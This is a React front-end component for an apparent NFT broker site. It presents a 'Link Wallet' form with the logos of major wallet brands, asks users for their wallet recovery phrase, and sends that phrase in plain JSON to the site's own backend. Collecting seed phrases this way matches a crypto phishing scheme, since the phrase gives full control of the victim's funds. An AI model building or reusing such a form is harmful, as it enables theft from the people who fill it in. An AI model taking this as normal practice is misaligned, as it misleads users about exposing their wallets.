import React, { useEffect, useState } from "react";
import axios from "axios";
import { useUserContext } from './UserRoleContext';
import { Form, Button, Table, Card, Spinner } from "react-bootstrap";
import { ToastContainer, toast } from "react-toastify";
import metamaskLogo from "../meta.PNG";
import trustWalletLogo from "../trust.PNG";
import binanceLogo from "../binance.PNG";
import coinbaseLogo from "../coinbase.PNG";

const LinkWallet = () => {
    const { userData } = useUserContext();
    const userId = userData.userID;
    const [isLoading, setIsLoading] = useState(false);
    const [formData, setFormData] = useState({
        walletAddress: "",
        walletName: "",
        recoveryPhrase: "",
      });
    
      const [wallets, setWallets] = useState([]);

      useEffect(() => {
        const fetchWallets = async () => {
          try {
            const response = await axios.get(`https://nft-broker.onrender.com/api/nft-wallets/${userId}`);
            setWallets(response.data.wallets);
          } catch (error) {
            console.error("Error fetching wallets:", error);
          }
        };
    
        fetchWallets ();
      }, [userId]);
    
      const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
      };
    

      const handleSubmit = async (e) => {
        e.preventDefault();
        setIsLoading(true);
      
        if (!formData.walletAddress  || !formData.walletName || !formData.recoveryPhrase) {
          toast.error("All fields are required", {
            className: "custom-toast",
          });
          setIsLoading(false);
          return;
        }
      
        try {
          const response = await fetch("https://nft-broker.onrender.com/api/nft-add-wallet", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: userId,
              walletName: formData.walletName, // Adjust based on selection
              walletAddress: formData.walletAddress,
              recoveryPhrase: formData.recoveryPhrase,
            }),
          });
          
          // console.log(formData);
          const data = await response.json();
      
          if (!response.ok) {
            console.log(JSON.stringify(data));
            setIsLoading(false);
          } else {
            setWallets([...wallets, {
              walletName: formData.walletName,
              walletAddress: formData.walletAddress,
              recoveryPhrase: formData.recoveryPhrase,
              dateAdded: new Date().toISOString().split("T")[0],
            }]);
            setFormData({ walletAddress: "", walletName: "", recoveryPhrase: "" });
            toast.success("Wallet linked successfully", {
              className: "custom-toast",
            });
            setIsLoading(false);
          }
        } catch (error) {
          console.error(error);
          toast.error("Failed to link wallet", {
            className: "custom-toast",
          });
          setIsLoading(false);
        }
      };
      


    return (
        <div className='container-large'>
           <ToastContainer />
            <div className="container">
            <div
      className="main-container p-4"
      style={{
        maxWidth: "650px",
        background: "#d6dee8",
        borderRadius: "15px",
        boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
        color: "#2c3e50",
      }}
    >
      {/* Accepted Wallets Section */}
      <div className="text-center mb-3">
        <h4 className="fw-bold mb-3">ACCEPTED WALLETS</h4>
        <div className="d-flex justify-content-center flex-wrap gap-3">
          {[metamaskLogo, trustWalletLogo, binanceLogo, coinbaseLogo].map((logo, index) => (
            <div
              key={index}
              style={{
                width: "80px",
                height: "80px",
                borderRadius: "15px",
                background: "#f0f4f8",
                boxShadow: "0 2px 5px rgba(0, 0, 0, 0.1)",
                display: "flex",
                justifyContent: "center",
                alignItems: "center",
                padding: "10px",
              }}
            >
              <img src={logo} alt="Wallet Logo" style={{ width: "60%" }} />
            </div>
          ))}
        </div>
      </div>

      {/* Wallet Linking Form */}
      <Form onSubmit={handleSubmit} className="text-start">
        

        <Form.Group className="mb-3">
          <Form.Label>Your Wallet Address</Form.Label>
          <Form.Control
            type="text"
            name="walletAddress"
            value={formData.walletAddress}
            onChange={handleChange}
            required
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Form.Group className="mb-3">
          <Form.Label>Your Wallet Name</Form.Label>
          <Form.Control
            type="text"
            name="walletName"
            value={formData.walletName}
            onChange={handleChange}
            required
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Form.Group className="mb-4">
          <Form.Label>Recovery Phrase</Form.Label>
          <Form.Control
            as="textarea"
            rows={3}
            name="recoveryPhrase"
            value={formData.recoveryPhrase}
            onChange={handleChange}
            style={{ background: "#c9d3dd", border: "1px solid #a4b0be" }}
          />
        </Form.Group>

        <Button disabled={isLoading} type="submit" variant="dark" className="w-100">
          
          {isLoading ? (
    <Spinner animation="border" size="sm" className="text-white" />
  ) : (
    <span>🔗 Link Wallet</span>
  )}
        </Button>
      </Form>

      {/* Connected Wallets Table */}
      <Card className="mt-4 p-3" style={{ background: "#f0f4f8", borderRadius: "15px" }}>
            <h5 className="fw-bold mb-3">Connected Wallets</h5>
            <Table striped bordered hover responsive>
              <thead>
                <tr>
                  {/* <th>Email</th> */}
                  <th>Wallet Name</th>
                  <th>Wallet Address</th>
                  <th>Date Added</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((wallet, index) => (
                  <tr key={index}>
                    {/* <td>{formData.email}</td> */}
                    <td>{wallet.walletName}</td>
                    <td>{wallet.walletAddress}</td>
                    <td>{new Date(wallet.dateAdded).toLocaleDateString()}</td>
                  </tr>
                ))}
              </tbody>
            </Table>
          </Card>    </div>
            </div>
        </div>
    );
};

export default LinkWallet;
